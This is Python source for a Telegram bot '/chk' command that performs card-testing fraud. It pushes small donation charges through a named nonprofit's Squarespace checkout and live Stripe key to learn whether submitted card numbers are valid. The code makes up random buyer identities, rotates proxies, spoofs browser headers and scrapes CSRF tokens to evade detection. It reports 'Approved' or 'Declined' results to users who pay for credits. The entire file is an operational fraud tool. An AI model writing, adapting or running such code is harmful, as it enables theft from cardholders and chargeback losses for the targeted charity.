import aiohttp
import asyncio
import time
import re
import json
import random
import uuid
from html import escape
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import CommandHandler, ContextTypes
from config import get_bin_info, kb_result, OWNER_ID, FORCE_CHANNELS, SUPPORT_LINK

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🦇 LIVELIHOODNW.ORG — SQUARESPACE + STRIPE GATE 🦇
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
BASE_URL       = "https://livelihoodnw.org"
STRIPE_PK      = "pk_live_51HaUnuDu7KhQIzIklfjMKv75dJw5tiJrYa3nouY2pD05DtgcPbZ4gkJZ7ScifFOZ3YNVBD8PlQSJ476tn6PVilB600Un5V8Dcw"
WEBSITE_ID     = "5d093b7c7ff6500001c3a4ae"
FUND_ID        = "362a32ea-7720-4a1e-92a6-b2a727afeaae"
DONATE_AMOUNT  = 50    # cents  →  $0.50 minimum
GATE_NAME      = "Sǫᴜᴀʀᴇꜱᴘᴀᴄᴇ 💳 🟢"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RANDOM IDENTITY
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
FIRST_NAMES = [
    "James","John","Robert","Michael","David","William","Richard","Joseph",
    "Thomas","Charles","Mary","Patricia","Jennifer","Linda","Barbara",
    "Elizabeth","Susan","Jessica","Sarah","Karen","Daniel","Matthew",
    "Anthony","Mark","Steven","Andrew","Joshua","Kevin","Brian","Edward",
]
LAST_NAMES = [
    "Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis",
    "Rodriguez","Martinez","Hernandez","Lopez","Gonzalez","Wilson","Anderson",
    "Thomas","Taylor","Moore","Jackson","Martin","Lee","Perez","Thompson",
    "White","Harris","Sanchez","Clark","Ramirez","Lewis","Robinson",
]
EMAIL_DOMAINS = ["gmail.com","yahoo.com","outlook.com","hotmail.com","protonmail.com","aol.com","icloud.com"]
US_CITIES = [
    ("Seattle","WA","98101"),("Portland","OR","97201"),("Tacoma","WA","98401"),
    ("Bellevue","WA","98004"),("Spokane","WA","99201"),("Olympia","WA","98501"),
    ("Boise","ID","83701"),("Eugene","OR","97401"),("Salem","OR","97301"),
    ("Vancouver","WA","98660"),
]
US_STREETS = [
    "1900 SE 15th St","1234 Main Street","5678 Oak Avenue","9012 Pine Boulevard",
    "3456 Maple Drive","7890 Cedar Lane","2345 Elm Street","6789 Birch Road",
    "0123 Walnut Court","4567 Willow Way",
]

CHROME_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
             "AppleWebKit/537.36 (KHTML, like Gecko) "
             "Chrome/124.0.0.0 Safari/537.36")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PROXY LOADER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def load_proxies():
    try:
        out = []
        with open("px.txt") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                if not line.startswith(("http", "socks")):
                    line = "http://" + line
                out.append(line)
        return out
    except FileNotFoundError:
        return []

PROXIES = load_proxies()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# USER DATA HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def get_user_data(user_id, context):
    uid = str(user_id)
    if "user_data" not in context.bot_data:
        context.bot_data["user_data"] = {}
    if uid not in context.bot_data["user_data"]:
        context.bot_data["user_data"][uid] = {
            "name": "User", "credits": 150,
            "plan": "TRIAL", "expires": 0, "pre_premium_credits": 0,
        }
    return context.bot_data["user_data"][uid]

def is_user_premium(ud):
    raw = ud.get("plan", "TRIAL").upper()
    if raw == "TRIAL":
        return False
    if ud.get("expires", 0) <= time.time():
        ud["plan"]    = "TRIAL"
        ud["credits"] = ud.get("pre_premium_credits", 150)
        ud["expires"] = 0
        return False
    return True

def get_styled_plan(raw_plan):
    p = raw_plan.upper()
    if p == "CORE":  return "✨ Cᴏʀᴇ ✨"
    if p == "ELITE": return "⭐ Eʟɪᴛᴇ ⭐"
    if p == "ROOT":  return "👑 Rᴏᴏᴛ 👑"
    return "Tʀɪᴀʟ"

async def _check_force_sub(user_id, context):
    if user_id == OWNER_ID:
        return []
    not_joined = []
    for name, link in FORCE_CHANNELS:
        try:
            member = await context.bot.get_chat_member(f"@{name}", user_id)
            if member.status in ("left", "kicked"):
                not_joined.append((name, link))
        except Exception:
            pass
    return not_joined

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# STEP 0 — GET CRUMB FROM HOMEPAGE
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def get_crumb(session, proxy):
    headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "no-cache",
        "pragma": "no-cache",
        "sec-ch-ua": '"Chromium";v="124","Google Chrome";v="124"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "none",
        "upgrade-insecure-requests": "1",
        "user-agent": CHROME_UA,
    }
    async with session.get(f"{BASE_URL}/", headers=headers, proxy=proxy, timeout=aiohttp.ClientTimeout(total=20)) as resp:
        html = await resp.text()

    # Crumb from cookie
    cookies = session.cookie_jar.filter_cookies(BASE_URL)
    crumb_cookie = cookies.get("crumb")
    if crumb_cookie:
        return crumb_cookie.value

    # Crumb from HTML (fallback)
    m = re.search(r'"crumb"\s*:\s*"([^"]{10,})"', html)
    if m:
        return m.group(1)

    raise Exception("STEP0_FAILED: crumb cookie not found — site may be blocking bots or is down")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# STEP 1 — POST DONATION → GET CART TOKEN
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def get_cart_token(session, crumb, proxy):
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "no-cache",
        "content-type": "application/json",
        "origin": BASE_URL,
        "pragma": "no-cache",
        "referer": f"{BASE_URL}/donate",
        "sec-ch-ua": '"Chromium";v="124","Google Chrome";v="124"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": CHROME_UA,
        "x-csrf-token": crumb,
    }
    payload = {
        "amount": {"value": DONATE_AMOUNT, "currencyCode": "USD"},
        "donationFrequency": "ONE_TIME",
        "feeAmount": None,
    }
    url = f"{BASE_URL}/api/v1/fund-service/websites/{WEBSITE_ID}/donations/funds/{FUND_ID}"
    async with session.post(
        url, headers=headers, json=payload, proxy=proxy,
        timeout=aiohttp.ClientTimeout(total=20)
    ) as resp:
        raw = await resp.text()
        try:
            data = json.loads(raw)
        except Exception:
            raise Exception(f"STEP1_FAILED: non-JSON response: {raw[:150]}")

    if "type" in data:
        raise Exception(f"STEP1_FAILED: {data.get('type','ERR')} — {json.dumps(data)[:150]}")

    redir = data.get("redirectUrlPath", "")
    m = re.search(r"cartToken=([^&\s]+)", redir)
    if not m:
        raise Exception(f"STEP1_FAILED: cartToken missing. Response: {json.dumps(data)[:150]}")
    return m.group(1)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# STEP 2 — VISIT CHECKOUT → xsrfToken + grandTotal
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def get_checkout_data(session, cart_token, proxy):
    headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "no-cache",
        "pragma": "no-cache",
        "referer": f"{BASE_URL}/donate",
        "sec-ch-ua": '"Chromium";v="124","Google Chrome";v="124"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "upgrade-insecure-requests": "1",
        "user-agent": CHROME_UA,
    }
    async with session.get(
        f"{BASE_URL}/checkout?cartToken={cart_token}",
        headers=headers, proxy=proxy, timeout=aiohttp.ClientTimeout(total=25)
    ) as resp:
        html = await resp.text()

    # Refresh crumb (checkout visit may rotate it)
    cookies = session.cookie_jar.filter_cookies(BASE_URL)
    crumb_cookie = cookies.get("crumb")
    crumb = crumb_cookie.value if crumb_cookie else None

    # ── xsrfToken — try multiple patterns ──
    xsrf = None
    xsrf_patterns = [
        r'"xsrfToken"\s*:\s*"([^"]{10,})"',
        r'xsrfToken["\s:]+([A-Za-z0-9+/=_\-]{20,})',
        r'name="csrf-token"\s+content="([^"]+)"',
        r'meta[^>]+name=["\']csrf-token["\'][^>]+content=["\']([^"\']+)["\']',
        r'"_csrf"\s*:\s*"([^"]+)"',
        r'data-csrf=["\']([^"\']+)["\']',
    ]
    for pat in xsrf_patterns:
        m = re.search(pat, html, re.IGNORECASE)
        if m:
            xsrf = m.group(1)
            break

    # ── grandTotal — try multiple patterns ──
    grand_total = None
    total_patterns = [
        r'"grandTotal"\s*:\s*\{[^}]*"decimalValue"\s*:\s*"([^"]+)"',
        r'"decimalValue"\s*:\s*"([^"]+)"',
        r'"grandTotal"\s*:\s*"([^"]+)"',
        r'"total"\s*:\s*"([^"]+)"',
    ]
    for pat in total_patterns:
        m = re.search(pat, html)
        if m:
            grand_total = m.group(1)
            break

    if not xsrf:
        # Last-ditch: look for any long token-like string near "xsrf" text
        m = re.search(r'xsrf[^"\']{0,30}["\']([A-Za-z0-9+/=_\-]{20,})["\']', html, re.IGNORECASE)
        if m:
            xsrf = m.group(1)

    if not xsrf:
        raise Exception("STEP2_FAILED: xsrfToken not found in checkout page — site may require JS rendering")
    if not grand_total:
        # Default to the expected donation amount
        grand_total = f"{DONATE_AMOUNT / 100:.2f}"

    return crumb, xsrf, grand_total

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# STEP 3 — TOKENIZE CARD ON STRIPE → tok_xxx
#
# KEY: We use POST /v1/tokens (legacy direct-charge path).
# The PK (pk_live_51HaUnuDu7KhQIzIk…) already belongs to
# acct_1HaUnuDu7KhQIzIk, so we do NOT pass _stripe_account
# in the body — doing so would conflict and cause errors.
# With tokens + universalPaymentElementEnabled:False, Squarespace
# charges the card directly with no 3DS loop.
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def create_stripe_token(session, card_data, full_name, address_info, proxy):
    street, city, state, zip_code = address_info

    headers = {
        "accept": "application/json",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://js.stripe.com",
        "referer": "https://js.stripe.com/",
        "user-agent": CHROME_UA,
    }

    # Normalise year to 4 digits for Stripe tokens
    yr = card_data["year"]
    if len(yr) == 2:
        yr = "20" + yr

    data = {
        "card[number]":          card_data["card_number"],
        "card[exp_month]":       card_data["month"],
        "card[exp_year]":        yr,
        "card[cvc]":             card_data["cvv"],
        "card[name]":            full_name,
        "card[address_line1]":   street,
        "card[address_city]":    city,
        "card[address_state]":   state,
        "card[address_zip]":     zip_code,
        "card[address_country]": "US",
        "key":                   STRIPE_PK,
        "payment_user_agent":    "stripe.js/v3",
        "guid":                  str(uuid.uuid4()),
        "muid":                  str(uuid.uuid4()),
        "sid":                   str(uuid.uuid4()),
    }

    async with session.post(
        "https://api.stripe.com/v1/tokens",
        headers=headers, data=data, proxy=proxy,
        timeout=aiohttp.ClientTimeout(total=20)
    ) as resp:
        rj = await resp.json(content_type=None)

    if "error" in rj:
        err  = rj["error"]
        code = err.get("code", "unknown_error")
        dc   = err.get("decline_code", "")
        msg  = err.get("message", "")
        raw  = json.dumps(err)
        label = f"[STRIPE] {code.upper()}"
        if dc:
            label += f"/{dc.upper()}"
        if msg:
            label += f" | {msg}"
        return None, f"{label} || {raw}"

    tok = rj.get("id", "")
    if not tok.startswith("tok_"):
        return None, f"[STRIPE] TOKENIZE_FAILED — unexpected response: {json.dumps(rj)[:150]}"
    return tok, None

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# STEP 4 — SUBMIT ORDER → REAL SITE RESPONSE
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def submit_order(session, cart_token, tok, full_name, email,
                       crumb, xsrf, address_info, grand_total, proxy):
    street, city, state, zip_code = address_info
    fn = full_name.split()[0]
    ln = " ".join(full_name.split()[1:]) if " " in full_name else ""
    phone = f"{random.randint(200,999)}{random.randint(200,999)}{random.randint(1000,9999)}"

    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "no-cache",
        "content-type": "application/json",
        "origin": BASE_URL,
        "pragma": "no-cache",
        "referer": f"{BASE_URL}/checkout?cartToken={cart_token}",
        "sec-ch-ua": '"Chromium";v="124","Google Chrome";v="124"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": CHROME_UA,
        "x-csrf-token": crumb or "",
        "x-siteuser-xsrf-token": xsrf or "",
    }

    payload = {
        "email": email,
        "subscribeToList": True,
        "shippingAddress": {
            "id": "", "firstName": "", "lastName": "", "line1": "", "line2": "",
            "city": "", "region": state, "postalCode": "", "country": "", "phoneNumber": "",
        },
        "createNewUser": False,
        "newUserPassword": None,
        "saveShippingAddress": False,
        "makeDefaultShippingAddress": False,
        "customFormData": None,
        "shippingAddressId": None,
        "proposedAmountDue": {"decimalValue": grand_total, "currencyCode": "USD"},
        "cartToken": cart_token,
        "paymentToken": {
            "stripePaymentTokenType": "TOKEN",
            "token": tok,
            "type": "STRIPE",
        },
        "reCaptchaToken": None,
        "billToShippingAddress": False,
        "billingAddress": {
            "id": "", "firstName": fn, "lastName": ln,
            "line1": street, "line2": "", "city": city,
            "region": state, "postalCode": zip_code,
            "country": "US", "phoneNumber": phone,
        },
        "savePaymentInfo": False,
        "makeDefaultPayment": False,
        "paymentCardId": None,
        "universalPaymentElementEnabled": False,
    }

    async with session.post(
        f"{BASE_URL}/api/2/commerce/orders",
        headers=headers, json=payload, proxy=proxy,
        timeout=aiohttp.ClientTimeout(total=35)
    ) as resp:
        raw_text = await resp.text()
        try:
            rj = json.loads(raw_text)
        except Exception:
            return "ERROR", f"STEP4_INVALID_JSON: {raw_text[:200]}"

    raw_json = json.dumps(rj)

    # ── Determine result ──
    ss       = rj.get("submissionStatus", "").upper()
    ft       = rj.get("failureType", "")
    order_id = rj.get("id") or rj.get("orderId") or rj.get("orderNumber")

    if order_id and (ss in ("", "ORDER_CONFIRMED") or not ft):
        return "CHARGED", raw_json
    elif ss == "ORDER_CONFIRMED":
        return "CHARGED", raw_json
    else:
        return "DECLINED", raw_json

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# /chk COMMAND
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def cmd_chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    if context.bot_data.get("maintenance") and user.id != OWNER_ID:
        await update.message.reply_text("⚠️ Bot is under maintenance. Try again later.")
        return

    if not context.bot_data.get("chk_on", True):
        await update.message.reply_text(
            "⚠️ Sǫᴜᴀʀᴇꜱᴘᴀᴄᴇ gate is currently <b>OFF</b>.", parse_mode="HTML"
        )
        return

    # ── Force-join check ──
    not_joined = await _check_force_sub(user.id, context)
    if not_joined:
        rows = [[InlineKeyboardButton(f"➺ Join @{n}", url=l)] for n, l in not_joined]
        rows.append([InlineKeyboardButton("✅ I Joined — Verify Now", callback_data="check_sub")])
        await update.message.reply_text(
            "<b>[ 𖥷iТ ] ➺ Jᴏɪɴ Rᴇǫᴜɪʀᴇᴅ</b>\n━━━━━━━━━━━━━━━━━\n"
            "Join our channel & group to use this bot.\n━━━━━━━━━━━━━━━━━",
            reply_markup=InlineKeyboardMarkup(rows), parse_mode="HTML",
        )
        return

    # ── Parse card ──
    card_str = None
    if context.args:
        card_str = context.args[0].strip()
    elif update.message.reply_to_message:
        rt   = update.message.reply_to_message
        text = rt.text or rt.caption or ""
        m    = re.search(
            r"(\d{13,19})\s*[|,;\s]\s*(\d{1,2})\s*[|,;\s]\s*(\d{2,4})\s*[|,;\s]\s*(\d{3,4})",
            text
        )
        if m:
            card_str = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"

    if not card_str:
        await update.message.reply_text(
            "⚠️ <b>Uꜱᴀɢᴇ:</b>\n<code>/chk cc|mm|yy|cvv</code>\n\n"
            "<b>Example:</b>\n<code>/chk 4111111111111111|12|26|123</code>",
            parse_mode="HTML",
        )
        return

    parts = re.split(r"[|,;/\s]+", card_str.strip())
    if len(parts) != 4:
        await update.message.reply_text(
            "❌ Invalid format. Use: <code>cc|mm|yy|cvv</code>", parse_mode="HTML"
        )
        return

    cc_num, mm, yy, cvv = [p.strip() for p in parts]
    if len(yy) == 4:
        yy = yy[-2:]
    card_str  = f"{cc_num}|{mm}|{yy}|{cvv}"
    card_data = {"card_number": cc_num, "month": mm.zfill(2), "year": yy, "cvv": cvv}

    ud      = get_user_data(user.id, context)
    premium = is_user_premium(ud)

    if not premium:
        if ud.get("credits", 0) <= 0:
            await update.message.reply_text(
                "<b>[ 𖥷iТ ] ➺ Nᴏ Cʀᴇᴅɪᴛꜱ ❌</b>\n━━━━━━━━━━━━━━━━━\n"
                "You have no credits left.\nRedeem a code with /rm or buy a plan.\n━━━━━━━━━━━━━━━━━",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("💎 BUY PREMIUM", callback_data="mprice")],
                    [InlineKeyboardButton("📞 Support",     url=SUPPORT_LINK)],
                ]),
            )
            return
        ud["credits"] -= 1

    msg        = await update.message.reply_text(
        "⏳ <b>[ 𖥷iТ ] ➺ Pʀᴏᴄᴇꜱꜱɪɴɢ...</b>\n"
        "<i>Connecting to Squarespace gate…</i>",
        parse_mode="HTML"
    )
    start_time = time.time()
    bin_num    = cc_num[:6]

    try:
        proxy = random.choice(PROXIES) if PROXIES else None

        async with aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=90),
            connector=aiohttp.TCPConnector(ssl=False),
        ) as session:

            # Step 0: crumb
            crumb = await get_crumb(session, proxy)

            # Step 1: donation → cartToken
            cart_token = await get_cart_token(session, crumb, proxy)

            # Step 2: checkout → xsrf + grandTotal
            crumb, xsrf, grand_total = await get_checkout_data(session, cart_token, proxy)

            # Random identity
            fn, ln    = random.choice(FIRST_NAMES), random.choice(LAST_NAMES)
            full_name = f"{fn} {ln}"
            email     = f"{fn.lower()}{ln.lower()}{random.randint(1, 99999)}@{random.choice(EMAIL_DOMAINS)}"
            city_data = random.choice(US_CITIES)
            addr_info = (random.choice(US_STREETS), city_data[0], city_data[1], city_data[2])

            # Step 3: Stripe tokenization → tok_xxx
            tok, stripe_err = await create_stripe_token(session, card_data, full_name, addr_info, proxy)

            if stripe_err:
                # Card rejected by Stripe before hitting the site
                raw_response = stripe_err
                gate_src     = "Stripe"
                if any(k in stripe_err for k in ("CARD_DECLINED", "card_declined", "INSUFFICIENT")):
                    status_ui = "Dᴇᴄʟɪɴᴇᴅ ❌"
                elif any(k in stripe_err for k in ("INCORRECT_NUMBER", "INVALID_NUMBER", "EXPIRED")):
                    status_ui = "Iɴᴠᴀʟɪᴅ ❌"
                else:
                    status_ui = "Eʀʀᴏʀ ⚠️"
            else:
                # Step 4: submit to Squarespace → real site response
                status, raw_response = await submit_order(
                    session, cart_token, tok, full_name, email,
                    crumb, xsrf, addr_info, grand_total, proxy,
                )
                gate_src  = GATE_NAME
                status_ui = "Aᴘᴘʀᴏᴠᴇᴅ ✅" if status == "CHARGED" else "Dᴇᴄʟɪɴᴇᴅ ❌"

        # BIN lookup
        bin_data = await get_bin_info(bin_num)
        bin_txt  = "N/A"
        if not bin_data.get("error"):
            s       = str(bin_data.get("scheme",  "N/A")).upper()
            b       = bin_data.get("bank",    "N/A")
            country = str(bin_data.get("country", "N/A")).upper()
            flag    = bin_data.get("country_emoji", "")
            bin_txt = f"{s} - {b} - {flag} {country}".strip()

        plan_ui     = get_styled_plan(ud.get("plan", "TRIAL"))
        username    = user.first_name or "User"
        elapsed     = f"{time.time() - start_time:.2f}"
        raw_display = str(raw_response)[:350]

        text = (
            f"<b>[ 𖥷iТ ] ➺ {status_ui}</b>\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"🔍 ➺ <code>{card_str}</code>\n"
            f"<b>Gᴀᴛᴇ</b> ➺ {gate_src}\n"
            f"<b>Rᴀᴡ</b>  ➺ <code>{escape(raw_display)}</code>\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"<b>Iɴꜰᴏ</b> ➺ {bin_txt}\n"
            f"<b>Uꜱᴇʀ</b> ➺ {escape(username)} ({plan_ui})\n"
            f"<b>Tɪᴍᴇ</b> ➺ {elapsed}s\n"
            f"<b>Pʀᴏ</b>  ➺ Batman⚡\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"📢 @Batcardchk"
        )
        await msg.edit_text(
            text, parse_mode="HTML",
            reply_markup=kb_result(premium),
            disable_web_page_preview=True,
        )

        # Update stats
        ud["total_checks"]  = ud.get("total_checks", 0) + 1
        ud["last_gate"]     = gate_src
        ud["last_active"]   = time.strftime("%Y-%m-%d %H:%M")
        if status_ui.startswith("Aᴘ"):
            ud["approved_checks"] = ud.get("approved_checks", 0) + 1
        else:
            ud["declined_checks"] = ud.get("declined_checks", 0) + 1

    except asyncio.TimeoutError:
        if not premium:
            ud["credits"] = ud.get("credits", 0) + 1
        await msg.edit_text(
            "<b>[ 𖥷iТ ] ➺ Tɪᴍᴇᴏᴜᴛ ❌</b>\n━━━━━━━━━━━━━━━━━\n"
            "Site took too long to respond.\nTry again in a few seconds.\n━━━━━━━━━━━━━━━━━",
            parse_mode="HTML",
        )
    except Exception as e:
        if not premium:
            ud["credits"] = ud.get("credits", 0) + 1
        err_txt = str(e)[:250]
        await msg.edit_text(
            f"<b>[ 𖥷iТ ] ➺ Eʀʀᴏʀ ❌</b>\n━━━━━━━━━━━━━━━━━\n"
            f"<code>{escape(err_txt)}</code>\n━━━━━━━━━━━━━━━━━",
            parse_mode="HTML",
        )


def get_chk_handler():
    return CommandHandler("chk", cmd_chk)
